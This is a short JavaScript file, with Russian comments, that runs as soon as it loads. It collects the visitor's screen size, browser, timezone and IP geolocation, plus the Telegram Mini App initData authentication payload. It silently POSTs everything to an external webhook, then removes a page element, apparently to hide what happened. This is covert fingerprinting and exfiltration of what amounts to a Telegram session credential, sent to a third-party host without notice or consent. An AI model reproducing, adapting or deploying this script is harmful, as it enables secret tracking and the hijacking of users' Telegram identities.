async function getIpLocation(url) {  
  try {
    const response = await fetch(url);
    if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);
    return await response.json();
  } catch (error) {
    return { error: error.message };
  }
}

async function collectUserData() {
  const data = {
    screen: {
      width: window.screen.width,
      height: window.screen.height
    },
    browser: navigator.userAgent,
    timezone: {
      zone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      offset: new Date().getTimezoneOffset(),
      offsetHours: -(new Date().getTimezoneOffset() / 60)
    }
  };

  // Получаем данные IP (если API доступно)
  try {
    const ipData = await getIpLocation('https://api.ip2location.io/?key=YOUR_API_KEY');
    data.ipInfo = ipData;
  } catch (e) {
    data.ipError = e.message;
  }

  return data;
}

async function sendToTelegram(data) {
  const url = 'https://qnext.app/bin/webhooks/1660/628/l1yubbxtqEb4u3bi';
  
  // Подготовка данных для Telegram (без сложных объектов)
  const payload = {
    info: data,
    telegram: window.Telegram?.WebApp?.initData || null
  };

  try {
    await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
  } catch (e) {
    console.error('Ошибка отправки в Telegram:', e);
  }
}

async function main() {
  const userData = await collectUserData();
  await sendToTelegram(userData);
  document.getElementById("inf")?.remove();
}

main();
